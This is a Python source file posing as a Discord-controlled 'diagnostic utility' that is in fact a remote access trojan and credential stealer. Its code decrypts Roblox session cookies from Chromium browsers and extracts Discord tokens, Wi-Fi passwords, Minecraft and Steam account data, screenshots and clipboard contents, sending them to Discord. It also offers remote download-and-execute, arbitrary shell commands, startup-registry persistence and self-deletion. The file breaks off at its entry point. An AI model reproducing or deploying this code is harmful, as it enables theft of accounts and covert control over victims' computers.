#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════╗
║  HDUTIL — Hermes Diagnostic Utility v3.1                       ║
║  Remote system management interface via Discord                 ║
║  Author: kaikssaqes                                             ║
║  Repo:  github.com/kaikssaqes/lklklk                            ║
╚══════════════════════════════════════════════════════════════════╝

SETUP:
  1. Set BOT_TOKEN below (copy from Discord Developer Portal)
  2. Set OWNER_ID to your Discord user ID (integer)
  3. Run:  pip install -r requirements.txt
  4. Launch:  python hdutil.py
"""
import asyncio
import base64
import ctypes
import json
import os
import re
import shutil
import socket
import sqlite3
import subprocess
import sys
import tempfile
import time
import uuid
from datetime import datetime
from io import BytesIO
from pathlib import Path
from typing import Optional, Tuple, List

import discord
import psutil
import requests
from discord.ext import commands
from mss import mss

# Try to import win32crypt (for DPAPI decryption)
try:
    import win32crypt
    HAS_WIN32CRYPT = True
except ImportError:
    HAS_WIN32CRYPT = False

# Try to import cryptography (for AES-GCM cookie decryption)
try:
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    HAS_CRYPTO = True
except ImportError:
    HAS_CRYPTO = False

# Try GPU info
try:
    import GPUtil as gpu_util
    HAS_GPU = True
except ImportError:
    HAS_GPU = False

# ═══════════════════════════════════════════════════════════════════
# CONFIGURATION — SET THESE
# ═══════════════════════════════════════════════════════════════════

# ── Load configuration from config.json ────────────────────────────
_config_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "config.json")
try:
    with open(_config_path, "r") as _f:
        _cfg = json.load(_f)
    BOT_TOKEN   = _cfg.get("bot_token", "")
    OWNER_ID    = int(_cfg.get("owner_id", 0))
    CMD_PREFIX  = _cfg.get("cmd_prefix", "!")
    BOT_STATUS  = _cfg.get("bot_status", "System Diagnostic Service")
except (FileNotFoundError, json.JSONDecodeError, KeyError) as e:
    print(f"[HDUTIL]  ERROR: Invalid or missing config.json — {e}")
    print("          Copy config.example.json to config.json and fill in your values.")
    sys.exit(1)

LOG_FILE    = None                        # Path to log file, or None

# ═══════════════════════════════════════════════════════════════════
# PERSISTENCE (optional — set INSTALL_DIR to enable)
# ═══════════════════════════════════════════════════════════════════

INSTALL_DIR = None                        # e.g. os.path.expandvars(r"%APPDATA%\HDUtil")
USE_STARTUP = False                       # Add to Windows startup registry

# ═══════════════════════════════════════════════════════════════════
# WEBHOOK (optional — sends startup notification + crash reports)
# ═══════════════════════════════════════════════════════════════════

WEBHOOK_URL = None                        # Discord webhook URL, or None


# ═══════════════════════════════════════════════════════════════════
# UTILITY HELPERS
# ═══════════════════════════════════════════════════════════════════

def owner_only():
    """Decorator: restrict a command to the bot owner only."""
    async def predicate(ctx: commands.Context) -> bool:
        if ctx.author.id != OWNER_ID:
            await ctx.send("\u26d4 Unauthorized \u2014 this session is monitored.")
            return False
        return True
    return commands.check(predicate)


def log(msg: str) -> None:
    """Append a timestamped line to the log file if configured."""
    if LOG_FILE is None:
        return
    stamp = datetime.now().strftime("[%Y-%m-%d %H:%M:%S]")
    try:
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(f"{stamp} {msg}\n")
    except Exception:
        pass


async def send_long(ctx: commands.Context, text: str, filename: str = "output.txt") -> None:
    """Send text as a Discord file if it exceeds the 2000-char message limit."""
    if len(text) <= 1900:
        await ctx.send(f"```\n{text}\n```")
    else:
        buf = BytesIO(text.encode("utf-8"))
        await ctx.send(file=discord.File(fp=buf, filename=filename))


def send_webhook(content: str) -> None:
    """Send a message to the configured webhook, if any."""
    if not WEBHOOK_URL:
        return
    try:
        requests.post(WEBHOOK_URL, json={"content": content}, timeout=10)
    except Exception:
        pass


# ═══════════════════════════════════════════════════════════════════
# PERSISTENCE
# ═══════════════════════════════════════════════════════════════════

def install_persistence() -> bool:
    """Copy the script to INSTALL_DIR and add a startup registry key."""
    if not INSTALL_DIR:
        return False

    src = os.path.abspath(__file__)
    dest = os.path.join(INSTALL_DIR, os.path.basename(__file__))

    try:
        os.makedirs(INSTALL_DIR, exist_ok=True)
        if os.path.normcase(src) != os.path.normcase(dest):
            shutil.copy2(src, dest)

        if USE_STARTUP:
            import winreg
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg:
                winreg.SetValueEx(reg, "HDUtilService", 0, winreg.REG_SZ,
                                  f'"{sys.executable}" "{dest}"')

        return True
    except Exception as e:
        log(f"Persistence install failed: {e}")
        return False


# ═══════════════════════════════════════════════════════════════════
# SYSTEM INFORMATION
# ═══════════════════════════════════════════════════════════════════

class SystemInfo:
    """Collects detailed system diagnostics."""

    @staticmethod
    def gather() -> str:
        import platform as plat

        uname = plat.uname()
        boot = datetime.fromtimestamp(psutil.boot_time()).strftime("%Y-%m-%d %H:%M:%S")
        hostname = socket.gethostname()

        lines = [
            "\u2554\u2550\u2550 System Diagnostic Report \u2550\u2550\u2557",
            f" Hostname      : {hostname}",
            f" OS            : {uname.system} {uname.release} ({uname.version})",
            f" Architecture  : {plat.architecture()[0]}",
            f" CPU           : {psutil.cpu_count(logical=False)} cores / {psutil.cpu_count()} threads",
            f" CPU Usage     : {psutil.cpu_percent(interval=1):.1f}%",
            f" RAM           : {psutil.virtual_memory().used // (1024**2):,} MiB used / "
            f"{psutil.virtual_memory().total // (1024**2):,} MiB total "
            f"({psutil.virtual_memory().percent:.1f}%)",
            f" Uptime        : {boot}",
            f" Local IP      : {socket.gethostbyname(hostname)}",
        ]

        # Disk usage
        for part in psutil.disk_partitions():
            try:
                usage = psutil.disk_usage(part.mountpoint)
                lines.append(
                    f" Disk [{part.device}] : {usage.used // (1024**3):,} / "
                    f"{usage.total // (1024**3):,} GiB ({usage.percent:.1f}%)"
                )
            except Exception:
                pass

        # GPU
        if HAS_GPU:
            try:
                for g in gpu_util.getGPUs():
                    lines.append(
                        f" GPU           : {g.name} \u2014 "
                        f"{g.memoryUsed:.0f}/{g.memoryTotal:.0f} MiB, "
                        f"{g.temperature}\u00b0C, {g.load*100:.0f}% load"
                    )
            except Exception:
                pass

        # Public IP
        try:
            pub_ip = requests.get("https://api.ipify.org", timeout=5).text.strip()
            lines.append(f" Public IP     : {pub_ip}")
        except Exception:
            lines.append(" Public IP     : (unreachable)")

        # Current user
        try:
            user = os.environ.get("USERNAME", os.environ.get("USER", "unknown"))
            lines.append(f" User          : {user}")
        except Exception:
            pass

        lines.append("\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557")
        return "\n".join(lines)


# ═══════════════════════════════════════════════════════════════════
# BROWSER COOKIE EXTRACTION
# ═══════════════════════════════════════════════════════════════════

class CookieGrabber:
    """
    Extracts .ROBLOSECURITY cookies from Chromium-based browsers.

    Encryption flow:
      1. Read 'Local State' JSON -> os_crypt.encrypted_key (base64)
      2. Decode base64, strip 5-byte 'DPAPI' prefix
      3. CryptUnprotectData -> raw AES-256-GCM key
      4. Query Cookies DB -> encrypted_value
      5. Strip 'v10'/'v20' prefix -> nonce[12] + ciphertext+tag
      6. AESGCM.decrypt -> plaintext cookie
    """

    BROWSERS: List[Tuple[str, str]] = [
        ("Chrome",       os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data")),
        ("Edge",         os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data")),
        ("Brave",        os.path.expandvars(r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data")),
        ("Opera",        os.path.expandvars(r"%APPDATA%\Opera Software\Opera Stable")),
        ("Opera GX",     os.path.expandvars(r"%APPDATA%\Opera Software\Opera GX Stable")),
        ("Vivaldi",      os.path.expandvars(r"%LOCALAPPDATA%\Vivaldi\User Data")),
        ("Chromium",     os.path.expandvars(r"%LOCALAPPDATA%\Chromium\User Data")),
    ]

    @staticmethod
    def _get_encryption_key(local_state_path: Path) -> Optional[bytes]:
        """Extract and decrypt the AES key from a browser's Local State file."""
        if not local_state_path.exists():
            return None
        try:
            with open(local_state_path, "r", encoding="utf-8") as f:
                state = json.load(f)
        except (json.JSONDecodeError, IOError):
            return None

        enc_key_b64 = state.get("os_crypt", {}).get("encrypted_key")
        if not enc_key_b64:
            return None

        try:
            encrypted_key = base64.b64decode(enc_key_b64)
            if encrypted_key[:5] != b"DPAPI":
                return None
            encrypted_key = encrypted_key[5:]
            if HAS_WIN32CRYPT:
                _, decrypted = win32crypt.CryptUnprotectData(
                    encrypted_key, None, None, None, 0
                )
                return decrypted
        except Exception:
            pass
        return None

    @staticmethod
    def _decrypt_value(encrypted_value: bytes, key: bytes) -> Optional[str]:
        """Decrypt a v10/v20 Chromium cookie value using AES-256-GCM."""
        if not HAS_CRYPTO:
            return None
        try:
            if encrypted_value[:3] not in (b"v10", b"v20"):
                return None
            blob = encrypted_value[3:]
            nonce = blob[:12]
            ciphertext = blob[12:]
            aes = AESGCM(key)
            plain = aes.decrypt(nonce, ciphertext, None)
            return plain.decode("utf-8", errors="replace")
        except Exception:
            return None

    @classmethod
    def grab_roblox(cls) -> str:
        """Iterate all browsers/profiles, return all .ROBLOSECURITY cookies found."""
        if not HAS_WIN32CRYPT or not HAS_CRYPTO:
            return "Missing dependencies: install pywin32 and cryptography"

        results: List[str] = []

        for browser_name, user_data_root in cls.BROWSERS:
            root = Path(user_data_root)
            if not root.exists():
                continue

            local_state = root / "Local State"
            key = cls._get_encryption_key(local_state)
            if key is None:
                continue

            for profile_dir in root.iterdir():
                if not profile_dir.is_dir():
                    continue

                cookie_db = profile_dir / "Network" / "Cookies"
                if not cookie_db.exists():
                    cookie_db = profile_dir / "Cookies"
                if not cookie_db.exists():
                    continue

                rows = cls._query_cookies(cookie_db)
                for enc_val in rows:
                    cookie = cls._decrypt_value(enc_val, key)
                    if cookie and cookie not in results:
                        results.append(cookie)

        if not results:
            return "No .ROBLOSECURITY cookies found."
        return "\n".join(f"[{i+1}]  {c}" for i, c in enumerate(results))

    @staticmethod
    def _query_cookies(db_path: Path) -> List[bytes]:
        """Copy cookie DB to temp, query for .ROBLOSECURITY, clean up."""
        try:
            tmp = tempfile.NamedTemporaryFile(delete=False, suffix=".db")
            tmp.close()
            shutil.copy2(str(db_path), tmp.name)
            conn = sqlite3.connect(tmp.name)
            cursor = conn.cursor()
            cursor.execute(
                "SELECT encrypted_value FROM cookies "
                "WHERE host_key LIKE '%roblox.com%' AND name = '.ROBLOSECURITY'"
            )
            rows = [row[0] for row in cursor.fetchall() if row[0]]
            conn.close()
            os.unlink(tmp.name)
            return rows
        except Exception:
            return []


# ═══════════════════════════════════════════════════════════════════
# DISCORD TOKEN EXTRACTION
# ═══════════════════════════════════════════════════════════════════

class TokenGrabber:
    """Extracts Discord tokens from local Discord client storage."""

    DISCORD_PATHS = [
        os.path.expandvars(r"%APPDATA%\discord"),
        os.path.expandvars(r"%APPDATA%\discordcanary"),
        os.path.expandvars(r"%APPDATA%\discordptb"),
        os.path.expandvars(r"%APPDATA%\discorddevelopment"),
    ]

    TOKEN_RE = re.compile(rb"[\w-]{24}\.[\w-]{6}\.[\w-]{27,38}")

    @classmethod
    def grab_all(cls) -> str:
        tokens: List[str] = []

        for base_path in cls.DISCORD_PATHS:
            base = Path(base_path)
            if not base.exists():
                continue

            local_state = base / "Local State"
            key = CookieGrabber._get_encryption_key(local_state)

            leveldb_dir = base / "Local Storage" / "leveldb"
            if not leveldb_dir.exists():
                continue

            for db_file in leveldb_dir.iterdir():
                if db_file.suffix not in (".ldb", ".log"):
                    continue
                try:
                    raw = db_file.read_bytes()
                except Exception:
                    continue

                if key and HAS_CRYPTO:
                    for match in re.finditer(rb"v10[\x00-\xff]{20,200}", raw):
                        blob = match.group()
                        try:
                            dec = CookieGrabber._decrypt_value(blob, key)
                            if dec and cls._looks_like_token(dec):
                                if dec not in tokens:
                                    tokens.append(dec)
                        except Exception:
                            continue

                for match in cls.TOKEN_RE.finditer(raw):
                    tok = match.group().decode("utf-8", errors="replace")
                    if cls._looks_like_token(tok) and tok not in tokens:
                        tokens.append(tok)

        if not tokens:
            return "No Discord tokens found."
        return "\n".join(f"[{i+1}]  {t}" for i, t in enumerate(tokens))

    @staticmethod
    def _looks_like_token(tok: str) -> bool:
        parts = tok.split(".")
        if len(parts) != 3:
            return False
        try:
            raw = base64.b64decode(parts[0] + "==")
            return len(raw) >= 12
        except Exception:
            return False


# ═══════════════════════════════════════════════════════════════════
# WI-FI PASSWORD EXTRACTION
# ═══════════════════════════════════════════════════════════════════

class WiFiGrabber:
    """Extracts saved Wi-Fi profiles and passwords via netsh."""

    @staticmethod
    def grab() -> str:
        try:
            profiles_raw = subprocess.check_output(
                ["netsh", "wlan", "show", "profiles"],
                shell=True, stderr=subprocess.DEVNULL
            ).decode("utf-8", errors="replace")
        except Exception:
            return "Failed to enumerate Wi-Fi profiles."

        names = re.findall(r":\s*(.+)$", profiles_raw, re.MULTILINE)
        if not names:
            return "No saved Wi-Fi profiles found."

        result = []
        for name in names:
            name = name.strip()
            try:
                detail = subprocess.check_output(
                    ["netsh", "wlan", "show", "profile", f"name={name}", "key=clear"],
                    shell=True, stderr=subprocess.DEVNULL
                ).decode("utf-8", errors="replace")
                pwd_match = re.search(r"Key Content\s*:\s*(.+)$", detail, re.MULTILINE)
                password = pwd_match.group(1).strip() if pwd_match else "(open / no password)"
            except Exception:
                password = "(error reading)"
            result.append(f"  {name:<30} \u2192  {password}")

        return "\n".join(result)


# ═══════════════════════════════════════════════════════════════════
# MINECRAFT SESSION GRABBER
# ═══════════════════════════════════════════════════════════════════

class MinecraftGrabber:
    """Extracts Minecraft launcher accounts from the .minecraft folder."""

    @staticmethod
    def grab() -> str:
        mc_dir = Path(os.path.expandvars(r"%APPDATA%\.minecraft"))
        launcher_accounts = mc_dir / "launcher_accounts.json"

        if not launcher_accounts.exists():
            return "No Minecraft launcher accounts found."

        try:
            with open(launcher_accounts, "r", encoding="utf-8") as f:
                data = json.load(f)

            accounts = data.get("accounts", {})
            if not accounts:
                return "No accounts in launcher_accounts.json."

            result = []
            for acc_id, acc in accounts.items():
                mc_profile_id = acc.get("minecraftProfile", {}).get("id", "N/A")
                mc_name = acc.get("minecraftProfile", {}).get("name", "N/A")
                xuid = acc.get("xuid", "N/A")
                access_token = acc.get("accessToken", "N/A")[:40] + "..."

                result.append(
                    f"  Name: {mc_name}\n"
                    f"  UUID: {mc_profile_id}\n"
                    f"  XUID: {xuid}\n"
                    f"  Token: {access_token}\n"
                )

            return "\n---\n".join(result)
        except Exception:
            return "Failed to parse Minecraft accounts."


# ═══════════════════════════════════════════════════════════════════
# STEAM SESSION GRABBER
# ═══════════════════════════════════════════════════════════════════

class SteamGrabber:
    """Extracts Steam login info from registry + config files."""

    @staticmethod
    def grab() -> str:
        if not HAS_WIN32CRYPT:
            return "Missing pywin32."

        try:
            import winreg
        except ImportError:
            return "Missing winreg."

        result = []

        # Steam is typically 32-bit on 64-bit OS, check both registry views
        for access in (winreg.KEY_READ | winreg.KEY_WOW64_32KEY,
                       winreg.KEY_READ | winreg.KEY_WOW64_64KEY):
            try:
                key = winreg.OpenKey(
                    winreg.HKEY_CURRENT_USER,
                    r"Software\Valve\Steam",
                    0, access
                )
                steam_path, _ = winreg.QueryValueEx(key, "SteamPath")
                last_user, _ = winreg.QueryValueEx(key, "AutoLoginUser")
                winreg.CloseKey(key)

                result.append(f"  Steam Path: {steam_path}")
                result.append(f"  Last User:  {last_user}")

                # Check for saved login users
                config_path = Path(steam_path) / "config" / "loginusers.vdf"
                if config_path.exists():
                    with open(config_path, "r", encoding="utf-8") as f:
                        content = f.read()
                    # Extract SteamID3 from VDF
                    ids = re.findall(r'"(\d{17})"', content)
                    if ids:
                        result.append(f"  Saved IDs:  {', '.join(ids[:5])}")

                break  # Found it
            except Exception:
                continue

        if not result:
            return "No Steam installation found."
        return "\n".join(result)


# ═══════════════════════════════════════════════════════════════════
# DISCORD BOT
# ═══════════════════════════════════════════════════════════════════

intents = discord.Intents.default()
intents.message_content = True

bot = commands.Bot(command_prefix=CMD_PREFIX, intents=intents, help_command=None)


@bot.event
async def on_ready():
    """Called when the bot successfully authenticates."""
    log(f"Bot online — {bot.user} — {len(bot.guilds)} guild(s)")
    await bot.change_presence(
        activity=discord.Activity(
            type=discord.ActivityType.watching,
            name=BOT_STATUS
        )
    )
    send_webhook(
        f"\U0001f7e2 **HDUTIL Online**\n"
        f"Hostname: `{socket.gethostname()}`\n"
        f"User: `{os.environ.get('USERNAME', 'unknown')}`\n"
        f"IP: `{socket.gethostbyname(socket.gethostname())}`\n"
        f"PID: `{os.getpid()}`"
    )
    print(
        f"[HDUTIL]  Connected as {bot.user}  |  "
        f"Prefix: {CMD_PREFIX}  |  Owner: {OWNER_ID}"
    )


@bot.event
async def on_command_error(ctx: commands.Context, error: Exception):
    """Central error handler."""
    if isinstance(error, commands.CommandNotFound):
        return
    if isinstance(error, commands.CheckFailure):
        return
    log(f"Command error [{ctx.command}]: {error}")
    try:
        await ctx.send(f"\u26a0\ufe0f  `{type(error).__name__}` — {error}")
    except Exception:
        pass


# ── Command: !help ───

@bot.command(name="help", aliases=["h", "commands"])
@owner_only()
async def help_cmd(ctx: commands.Context):
    """Display available commands."""
    embed = discord.Embed(
        title="HDUTIL v3.1 — Command Reference",
        description="Remote system management interface.",
        color=0x3498DB,
        timestamp=datetime.utcnow()
    )
    cmds = {
        "!screen":       "Capture live display output",
        "!cookie":       "Retrieve browser-session credentials (Roblox)",
        "!info":         "Display comprehensive system diagnostic",
        "!download":     "Fetch remote asset (URL \u2192 disk \u2192 execute)",
        "!shell <cmd>":  "Execute terminal command (ps: for PS)",
        "!proclist":     "Enumerate active process table",
        "!wifi":         "Retrieve stored wireless credentials",
        "!tokens":       "Extract Discord client session tokens",
        "!minecraft":    "Extract Minecraft launcher accounts",
        "!steam":        "Extract Steam login info",
        "!clipboard":    "Read current clipboard text",
        "!message":      "Display a Windows notification popup",
        "!upload <path>": "Transfer local file to remote terminal",
        "!location":     "Resolve public geolocation",
        "!exit":         "Terminate this diagnostic session",
        "!selfdestruct": "Purge diagnostic agent from host disk",
    }
    for cmd, desc in cmds.items():
        embed.add_field(name=cmd, value=desc, inline=False)
    embed.set_footer(text=f"Authorized operator: {OWNER_ID}")
    await ctx.send(embed=embed)


# ── Command: !screen ───

@bot.command(name="screen", aliases=["ss", "screenshot"])
@owner_only()
async def screen_cmd(ctx: commands.Context):
    """Capture and upload a screenshot of all monitors."""
    tmp_path = None
    try:
        with mss() as sct:
            tmp_path = os.path.join(
                tempfile.gettempdir(),
                f"hdutil_scr_{int(time.time())}.png"
            )
            sct.shot(output=tmp_path)
        await ctx.send(file=discord.File(fp=tmp_path, filename="screenshot.png"))
        log(f"Screenshot sent to {ctx.author}")
    except Exception as e:
        await ctx.send(f"\u26a0\ufe0f  Screen capture failed: `{e}`")
    finally:
        if tmp_path and os.path.exists(tmp_path):
            os.remove(tmp_path)


# ── Command: !cookie ───

@bot.command(name="cookie", aliases=["roblox", "cookies", "grab"])
@owner_only()
async def cookie_cmd(ctx: commands.Context):
    """Extract .ROBLOSECURITY cookies from all Chromium browsers."""
    await ctx.send("\U0001f50d  Scanning browser stores \u2026")
    result = CookieGrabber.grab_roblox()
    await send_long(ctx, result, "cookies.txt")
    log(f"Cookie extraction by {ctx.author}")


# ── Command: !info ───

@bot.command(name="info", aliases=["sysinfo", "system"])
@owner_only()
async def info_cmd(ctx: commands.Context):
    """Display comprehensive system diagnostic report."""
    await ctx.send("\U0001f4ca  Gathering diagnostics \u2026")
    report = SystemInfo.gather()
    await send_long(ctx, report, "sysinfo.txt")
    log(f"Sysinfo sent to {ctx.author}")


# ── Command: !download ───

@bot.command(name="download", aliases=["dl", "fetch"])
@owner_only()
async def download_cmd(ctx: commands.Context, url: str, *, filename: Optional[str] = None):
    """Download a remote file and execute it. Supports .exe/.ps1/.bat/.msi/.vbs/.py/.js"""
    await ctx.send(f"\u2b07\ufe0f  Fetching: `{url[:100]}` \u2026")

    if filename is None:
        filename = url.rsplit("/", 1)[-1].split("?")[0] or f"payload_{int(time.time())}.exe"

    dest = os.path.join(tempfile.gettempdir(), filename)

    try:
        headers = {
            "User-Agent": (
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                "AppleWebKit/537.36 (KHTML, like Gecko) "
                "Chrome/127.0.0.0 Safari/537.36"
            )
        }
        r = requests.get(url, headers=headers, timeout=120, stream=True)
        r.raise_for_status()

        with open(dest, "wb") as f:
            for chunk in r.iter_content(chunk_size=8192):
                f.write(chunk)

        size = os.path.getsize(dest)
        await ctx.send(f"\U0001f4e6  Downloaded `{filename}` ({size:,} bytes) \u2014 executing \u2026")

        ext = os.path.splitext(filename)[1].lower()
        launch_map = {
            ".exe": [dest],
            ".msi": ["msiexec", "/i", dest, "/quiet"],
            ".ps1": ["powershell", "-ExecutionPolicy", "Bypass", "-File", dest],
            ".bat": [dest],
            ".cmd": [dest],
            ".vbs": ["cscript", "//Nologo", dest],
            ".py":  [sys.executable, dest],
            ".js":  ["node", dest],
        }

        cmd = launch_map.get(ext, [dest])
        flags = subprocess.CREATE_NO_WINDOW
        if ext in (".bat", ".cmd"):
            subprocess.Popen(cmd, creationflags=flags, shell=True)
        else:
            subprocess.Popen(cmd, creationflags=flags)

        await ctx.send(f"\u2705  `{filename}` launched.")
        log(f"Download+exec: {url} \u2192 {dest}")

    except requests.RequestException as e:
        await ctx.send(f"\u26a0\ufe0f  Download failed: `{e}`")
    except Exception as e:
        await ctx.send(f"\u26a0\ufe0f  Execution failed: `{e}`")


# ── Command: !shell ───

@bot.command(name="shell", aliases=["cmd", "exec", "run"])
@owner_only()
async def shell_cmd(ctx: commands.Context, *, command: str):
    """Execute a shell command. Prefix with 'ps:' for PowerShell."""
    await ctx.send(f"\U0001f5a5\ufe0f  Executing: `{command[:200]}` \u2026")

    try:
        if command.lower().startswith("ps:"):
            cmd = ["powershell", "-ExecutionPolicy", "Bypass", "-Command",
                   command[3:].strip()]
        else:
            cmd = ["cmd", "/c", command]

        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=30)

        output = stdout.decode("utf-8", errors="replace") or "(no output)"
        if stderr:
            output += f"\n[stderr]\n{stderr.decode('utf-8', errors='replace')}"

        await send_long(ctx, output[:4000], "shell_output.txt")

    except asyncio.TimeoutError:
        await ctx.send("\u23f0  Command timed out.")
    except Exception as e:
        await ctx.send(f"\u26a0\ufe0f  Shell error: `{e}`")


# ── Command: !proclist ───

@bot.command(name="proclist", aliases=["ps", "processes", "tasks"])
@owner_only()
async def proclist_cmd(ctx: commands.Context):
    """Enumerate all running processes."""
    await ctx.send("\U0001f4cb  Enumerating processes \u2026")
    lines = [f"{'PID':>8}  {'Name':<28} {'Memory':>10}  User", "-" * 80]

    for proc in sorted(
        psutil.process_iter(["pid", "name", "memory_info", "username"]),
        key=lambda p: p.info.get("memory_info", None) or 0,
        reverse=True
    ):
        try:
            pid  = proc.info["pid"]
            name = (proc.info["name"] or "?")[:27]
            mem  = proc.info.get("memory_info")
            mem_str = f"{mem.rss // 1024:,} KiB" if mem else "\u2014"
            user = (proc.info.get("username") or "?")[:20]
            lines.append(f"{pid:>8}  {name:<28} {mem_str:>10}  {user}")
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            continue

    await send_long(ctx, "\n".join(lines[:120]), "proclist.txt")
    log(f"Proclist sent to {ctx.author}")


# ── Command: !wifi ───

@bot.command(name="wifi", aliases=["wifipass", "wlan"])
@owner_only()
async def wifi_cmd(ctx: commands.Context):
    """Extract saved Wi-Fi SSIDs and passwords."""
    await ctx.send("\U0001f4f6  Scanning wireless profiles \u2026")
    result = WiFiGrabber.grab()
    await send_long(ctx, result, "wifi.txt")
    log(f"Wi-Fi data sent to {ctx.author}")


# ── Command: !tokens ───

@bot.command(name="tokens", aliases=["token", "discordtoken", "dtokens"])
@owner_only()
async def tokens_cmd(ctx: commands.Context):
    """Extract Discord tokens from local clients."""
    await ctx.send("\U0001f511  Scanning Discord client stores \u2026")
    result = TokenGrabber.grab_all()
    await send_long(ctx, result, "tokens.txt")
    log(f"Token extraction by {ctx.author}")


# ── Command: !minecraft ───

@bot.command(name="minecraft", aliases=["mc", "mcaccounts"])
@owner_only()
async def minecraft_cmd(ctx: commands.Context):
    """Extract Minecraft launcher accounts."""
    await ctx.send("\u26cf\ufe0f  Scanning Minecraft launcher \u2026")
    result = MinecraftGrabber.grab()
    await send_long(ctx, result, "minecraft.txt")
    log(f"Minecraft data sent to {ctx.author}")


# ── Command: !steam ───

@bot.command(name="steam", aliases=["steaminfo", "steamlogin"])
@owner_only()
async def steam_cmd(ctx: commands.Context):
    """Extract Steam login info from registry."""
    await ctx.send("\U0001f579\ufe0f  Scanning Steam registry \u2026")
    result = SteamGrabber.grab()
    await send_long(ctx, result, "steam.txt")
    log(f"Steam data sent to {ctx.author}")


# ── Command: !clipboard ───

@bot.command(name="clipboard", aliases=["clip", "paste"])
@owner_only()
async def clipboard_cmd(ctx: commands.Context):
    """Read current Windows clipboard contents."""
    if HAS_WIN32CRYPT:
        try:
            import win32clipboard
            win32clipboard.OpenClipboard()
            data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            await send_long(ctx, str(data)[:4000], "clipboard.txt")
            return
        except Exception:
            pass

    # PowerShell fallback
    try:
        out = subprocess.check_output(
            ["powershell", "-Command", "Get-Clipboard"],
            shell=True, stderr=subprocess.DEVNULL, timeout=5
        ).decode("utf-8", errors="replace")
        await send_long(ctx, out[:4000], "clipboard.txt")
    except Exception:
        await ctx.send("\u26a0\ufe0f  Clipboard empty or inaccessible.")


# ── Command: !message ───

@bot.command(name="message", aliases=["msg", "popup", "alert"])
@owner_only()
async def message_cmd(ctx: commands.Context, *,
                      text: str = "Diagnostic check complete."):
    """Display a Windows message box."""
    ctypes.windll.user32.MessageBoxW(
        0, text, "System Notification", 0x40 | 0x1
    )
    await ctx.send(f"\u2705  Popup displayed.")


# ── Command: !upload ───

@bot.command(name="upload", aliases=["up", "grab", "exfil"])
@owner_only()
async def upload_cmd(ctx: commands.Context, *, filepath: str):
    """Upload a local file to Discord (max 8 MiB)."""
    path = Path(filepath.strip('"'))
    if not path.exists():
        await ctx.send(f"\u26a0\ufe0f  File not found: `{filepath}`")
        return
    if not path.is_file():
        await ctx.send(f"\u26a0\ufe0f  Not a file: `{filepath}`")
        return

    size_mb = path.stat().st_size / (1024 * 1024)
    if size_mb > 8.0:
        await ctx.send(
            f"\u26a0\ufe0f  File too large ({size_mb:.1f} MiB). Discord limit: 8 MiB."
        )
        return

    try:
        await ctx.send(file=discord.File(fp=str(path), filename=path.name))
        log(f"Uploaded: {filepath}")
    except Exception as e:
        await ctx.send(f"\u26a0\ufe0f  Upload failed: `{e}`")


# ── Command: !location ───

@bot.command(name="location", aliases=["loc", "geo", "where"])
@owner_only()
async def location_cmd(ctx: commands.Context):
    """Resolve public IP to geolocation."""
    await ctx.send("\U0001f30d  Resolving \u2026")
    try:
        pub_ip = requests.get("https://api.ipify.org", timeout=5).text.strip()
        geo = requests.get(
            f"http://ip-api.com/json/{pub_ip}", timeout=5
        ).json()
        if geo.get("status") == "success":
            msg = (
                f"**Public IP:**  `{pub_ip}`\n"
                f"**Country:**    {geo.get('country')} ({geo.get('countryCode')})\n"
                f"**Region:**     {geo.get('regionName')}\n"
                f"**City:**       {geo.get('city')}\n"
                f"**ZIP:**        {geo.get('zip')}\n"
                f"**ISP:**        {geo.get('isp')}\n"
                f"**Coords:**     {geo.get('lat')}, {geo.get('lon')}\n"
                f"**Timezone:**   {geo.get('timezone')}"
            )
            await ctx.send(msg)
        else:
            await ctx.send(
                f"\u26a0\ufe0f  Geo lookup failed: `{geo.get('message', 'unknown')}`"
            )
    except Exception as e:
        await ctx.send(f"\u26a0\ufe0f  Geolocation failed: `{e}`")


# ── Command: !exit ───

@bot.command(name="exit", aliases=["quit", "stop", "shutdown"])
@owner_only()
async def exit_cmd(ctx: commands.Context):
    """Gracefully shut down the agent."""
    await ctx.send("\U0001f6d1  Shutting down. Goodbye.")
    log("Exit commanded.")
    send_webhook("\U0001f534 HDUTIL offline — graceful shutdown.")
    await bot.close()


# ── Command: !selfdestruct ───

@bot.command(name="selfdestruct", aliases=["purge", "burn", "destroy"])
@owner_only()
async def selfdestruct_cmd(ctx: commands.Context):
    """Remove this agent from the filesystem."""
    await ctx.send("\U0001f4a5  Self-destruct initiated. Purging agent \u2026")

    script_path = os.path.abspath(
        sys.argv[0] if getattr(sys, 'frozen', False) else __file__
    )

    ps_cmd = (
        f"Start-Sleep -Seconds 3; "
        f"Remove-Item -Path '{script_path}' -Force -ErrorAction SilentlyContinue; "
        f"Remove-Item -Path (Get-Item $MyInvocation.MyCommand.Source) -Force -ErrorAction SilentlyContinue"
    )
    subprocess.Popen(
        ["powershell", "-WindowStyle", "Hidden", "-NoProfile", "-Command", ps_cmd],
        creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS,
        close_fds=True,
    )

    log(f"Selfdestruct — purging {script_path}")
    send_webhook("\U0001f4a5 HDUTIL self-destructed.")
    await bot.close()


# ═══════════════════════════════════════════════════════════════════
# ENTRY POINT
# ═══════════════════════════════════════════════════════════════════

if __name__ == "__main__":
